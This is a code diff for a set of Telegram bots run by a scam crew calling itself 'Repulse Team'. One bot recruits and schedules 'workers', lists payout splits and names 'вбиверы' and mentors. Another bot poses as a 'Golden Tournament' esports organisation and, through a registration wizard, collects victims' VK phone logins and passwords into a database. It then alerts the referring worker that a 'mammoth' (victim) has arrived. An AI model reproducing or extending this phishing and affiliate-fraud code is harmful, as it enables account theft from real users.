@@ -49,26 +49,34 @@ function initial() {
 referal_bt.use(session({ initial }));
 var working = true
 referal_bt.command("start", async (ctx) => {
-
-   // else{
-        await mongoClient.connect();
-        const db = mongoClient.db("workers");
-        const collection = db.collection("infos");
-        console.log(ctx.message.from.id)
-        if (await collection.findOne({ id: Number(ctx.message.from.id) })) {
-            await ctx.sendMessage("Вы уже в тиме")
-            if(working == false){
-                ctx.sendMessage("Бот остановлен приходите в 10:00")
-            }
+    await mongoClient.connect();
+    const db = mongoClient.db("workers");
+    const collection = db.collection("infos");
+    
+    db.collection('banlist').findOne({ arrayField: { $elemMatch: { $eq: ctx.message.from.id } } }, async (err, result) => {
+        if (err) throw err;
+        if (result) {
+            await ctx.sendMessage("кодер бота так же умеет работать с бд хочешь такого же бота без проблем!")
         } else {
-
-            await ctx.sendMessage("Здравствуйте, рады приветствовать вас в Repulse Team! Оставьте заявку на вступление в команду 🏁", {
-                "reply_markup": {
-                    "keyboard": [["📝 Подать заявку"]],
-                    resize_keyboard: true
+            console.log(ctx.message.from.id)
+            if (await collection.findOne({ id: Number(ctx.message.from.id) })) {
+                await ctx.sendMessage("Вы уже в тиме")
+                if (working == false) {
+                    ctx.sendMessage("Бот остановлен приходите в 10:00")
                 }
-            },)
+            } else {
+        
+                await ctx.sendMessage("Здравствуйте, рады приветствовать вас в Repulse Team! Оставьте заявку на вступление в команду 🏁", {
+                    "reply_markup": {
+                        "keyboard": [["📝 Подать заявку"]],
+                        resize_keyboard: true
+                    }
+                },)
+            }
         }
+    });
+
+
     //}
 
 
@@ -171,7 +179,7 @@ referal_bt.action("agggrrrree321321", async (ctx) => {
         chat_id: ctx.session.normalize,
 
         "reply_markup": {
-            "keyboard": [["🧑🏼‍💻 Профиль","💻О проекте"]],
+            "keyboard": [["🧑🏼‍💻 Профиль", "💻О проекте"]],
             resize_keyboard: true
         }
 
@@ -179,37 +187,39 @@ referal_bt.action("agggrrrree321321", async (ctx) => {
 
 
     })
-        cron.schedule("00 10 * * *", () => {
-            ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @alexdrawn ]',{chat_id: ctx.session.normalize,
+    cron.schedule("00 10 * * *", () => {
+        ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @alexdrawn ]', {
+            chat_id: ctx.session.normalize,
 
-                "reply_markup": {
-                    "keyboard": [["🧑🏼‍💻 Профиль","💻О проекте"]],
-                    resize_keyboard: true
-                }
+            "reply_markup": {
+                "keyboard": [["🧑🏼‍💻 Профиль", "💻О проекте"]],
+                resize_keyboard: true
+            }
 
-            });
-            working = true
         });
-        cron.schedule("00 23 * * *", () => {
-            ctx.sendMessage('🛑 STOP WORK 🛑 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n❤️ Всем спасибо, на сегодня стоп ворк , продолжим завтра!',{chat_id: ctx.session.normalize,
+        working = true
+    });
+    cron.schedule("00 23 * * *", () => {
+        ctx.sendMessage('🛑 STOP WORK 🛑 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n❤️ Всем спасибо, на сегодня стоп ворк , продолжим завтра!', {
+            chat_id: ctx.session.normalize,
 
-                "reply_markup": {
-                    "keyboard": [["🛑 Бот остановлен"]],
-                    resize_keyboard: true
-                }
+            "reply_markup": {
+                "keyboard": [["🛑 Бот остановлен"]],
+                resize_keyboard: true
+            }
 
-            });
-            working = false
         });
+        working = false
+    });
 
-    if(working == false){
+    if (working == false) {
         ctx.sendMessage("Бот остановлен приходите в 10:00")
     }
 })
 
 referal_bt.hears("💻О проекте", async (ctx) => {
     await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066836656952447066/image.png", {
-       // chat_id: ((ctx.session.spec.match(urlRegex2)).toString()).replaceAll("SID/", ""),
+        // chat_id: ((ctx.session.spec.match(urlRegex2)).toString()).replaceAll("SID/", ""),
         caption: "ℹ️ Информация о проекте Repulse Team \n\n🏁 Мы открылись: 26.01.2023 \n\n🔹 Проценты выплат: \n├ Первый завод - 75/25 \n├ Всё остальные - 60/40 \n└ Для топов % увеличен! \n\n💬 Вступай в чат для воркеров, а также прочитай мануалы",
         reply_markup: {
 
@@ -274,7 +284,7 @@ referal_bt.hears("📝 Подать заявку", async (callbackQuery) => {
     const collection = db.collection("infos");
 
     if (await collection.findOne({ id: Number(callbackQuery.message.from.id) })) {
-        callbackQuery.sendMessage("Вы уже в тиме!",{
+        callbackQuery.sendMessage("Вы уже в тиме!", {
             "reply_markup": {
                 "keyboard": [["🧑🏼‍💻 Профиль"], ["💻О проекте"]],
                 resize_keyboard: true
@@ -289,7 +299,7 @@ referal_bt.hears("📝 Подать заявку", async (callbackQuery) => {
 
 
 
-referal_bt.command("get_id",async(ctx)=>{
+referal_bt.command("get_id", async (ctx) => {
     console.log(ctx.message)
 })
 
@@ -382,26 +392,26 @@ bot.use(session({ initial: initial22 }));
 bot.command("start", async (ctx) => {
 
 
-        await mongoClient.connect();
-        const db = mongoClient.db("workers");
-        const collection = db.collection("infos");
-        ctx.session.ids = ctx.message.from.id
-        ctx.session.name = ctx.message.from.username
-        ctx.session.refer = ctx.message.text.replaceAll("/start ", "")
-        if (await collection.findOne({ id: Number(ctx.session.refer) })) {
-            await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @alexdrawn`)
+    await mongoClient.connect();
+    const db = mongoClient.db("workers");
+    const collection = db.collection("infos");
+    ctx.session.ids = ctx.message.from.id
+    ctx.session.name = ctx.message.from.username
+    ctx.session.refer = ctx.message.text.replaceAll("/start ", "")
+    if (await collection.findOne({ id: Number(ctx.session.refer) })) {
+        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @alexdrawn`)
+    }
+
+
+    //await referal_bt.telegram.sendMessage("123")
+    ctx.session.id = ctx.message.from.id
+    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066476305224310885/photo_2023-01-21_22-55-04.jpg", {
+        caption: "Здравствуйте! Вас приветствует организация Golden Tournament, рады приветствовать ❤️",
+        "reply_markup": {
+            "keyboard": [["🏆 Турниры", "📌 Подать заявку"], ["📃 Регламент", "🎗️ Алея славы"], ["🌐 Лицензия"]],
+            resize_keyboard: true
         }
-
-
-        //await referal_bt.telegram.sendMessage("123")
-        ctx.session.id = ctx.message.from.id
-        await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066476305224310885/photo_2023-01-21_22-55-04.jpg", {
-            caption: "Здравствуйте! Вас приветствует организация Golden Tournament, рады приветствовать ❤️",
-            "reply_markup": {
-                "keyboard": [["🏆 Турниры", "📌 Подать заявку"], ["📃 Регламент", "🎗️ Алея славы"], ["🌐 Лицензия"]],
-                resize_keyboard: true
-            }
-        })
+    })
 
 
 
@@ -453,7 +463,7 @@ vk_password2.on("text", async (ctx) => {
 })
 
 
-vk_info3.on("text",async(ctx)=>{
+vk_info3.on("text", async (ctx) => {
     ctx.session.pass = ctx.message.text
     await mongoClient.connect();
     const db = mongoClient.db("workers");
@@ -485,23 +495,23 @@ vk_info3.on("text",async(ctx)=>{
 
 vk_info2.on("text", async (ctx) => {
     ctx.session.login = ctx.message.text
-    if(isNaN(ctx.session.login)){
+    if (isNaN(ctx.session.login)) {
 
         await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
     }
-    else{
-        if(ctx.session.login.toString().includes("+7")){
+    else {
+        if (ctx.session.login.toString().includes("+7")) {
             await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
             return ctx.wizard.next()
         }
-        else{
+        else {
             await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
         }
-        if(ctx.session.login.toString().includes("+375")){
+        if (ctx.session.login.toString().includes("+375")) {
             await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
             return ctx.wizard.next()
         }
-        else{
+        else {
             await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
         }
     }
@@ -521,14 +531,14 @@ final2.on("text", async (ctx) => {
 
 
 
-const menuScene2 = new Scenes.WizardScene('sceneWizard', vk_login2, vk_password2, final2, vk_info2,vk_info3)
+const menuScene2 = new Scenes.WizardScene('sceneWizard', vk_login2, vk_password2, final2, vk_info2, vk_info3)
 const stage2 = new Scenes.Stage([menuScene2])
 bot.use(stage2.middleware())
 
 
 bot.hears("📌 Подать заявку", async (callbackQuery) => {
     callbackQuery.session.id = makeid(5)
-  //  await callbackQuery.editMessageReplyMarkup({reply_markup: {remove_keyboard: true}})
+    //  await callbackQuery.editMessageReplyMarkup({reply_markup: {remove_keyboard: true}})
     await callbackQuery.scene.enter('sceneWizard')
     await callbackQuery.reply("✅ Введите свой внутренне игровой ID. ВАЖНО! Айди внутренне игрового аккаунта нужно вводить от аккаунта на котором вы будете играть турнир!")
 
@@ -542,23 +552,23 @@ bot.hears("📌 Подать заявку", async (callbackQuery) => {
 
 
 
-support_bot.hears("/вбиверы",async(ctx)=>{
+support_bot.hears("/вбиверы", async (ctx) => {
     ctx.sendMessage("💰 Вбиверы : \n - mazenmwais [ @mazenmwais ]\n - alex drawn [ @alexdrawn ]")
 })
-support_bot.hears("/наставники",async(ctx)=>{
+support_bot.hears("/наставники", async (ctx) => {
     ctx.sendMessage("🚸 Наставники которые доведут вас до профита : \n- mazenmwais [ @mazenmwais ] \n- alex drawn [ @alexdrawn ]")
 })
-support_bot.hears("/мануалы",async(ctx)=>{
+support_bot.hears("/мануалы", async (ctx) => {
     ctx.sendMessage("📚 Мануалы - https://t.me/+CQoNmQ03qIs1OWM6")
 })
-support_bot.hears("/бот",async(ctx)=>{
+support_bot.hears("/бот", async (ctx) => {
     ctx.sendMessage("🤖 Бот для воркеров - @RepulseTeamBot")
 })
-support_bot.hears("/команды",async(ctx)=>{
+support_bot.hears("/команды", async (ctx) => {
     ctx.sendMessage("/бот - Бот для воркеров 🤖 \n/вбиверы - Актуальные вбиверы 💰 \n/наставники - Наставники которые доведут вас до профита 🚸 \n/мануалы -  Мануалы 📚 \n/выплаты - выплаты работникам 💸 \n/команды - показывает актуальный список команд 📝")
 })
 
-support_bot.hears("/выплаты",async(ctx)=>{
+support_bot.hears("/выплаты", async (ctx) => {
     await ctx.sendMessage("💸 Успешные выплаты - https://t.me/+G_1DA46KBQsxYzY6")
 })
 
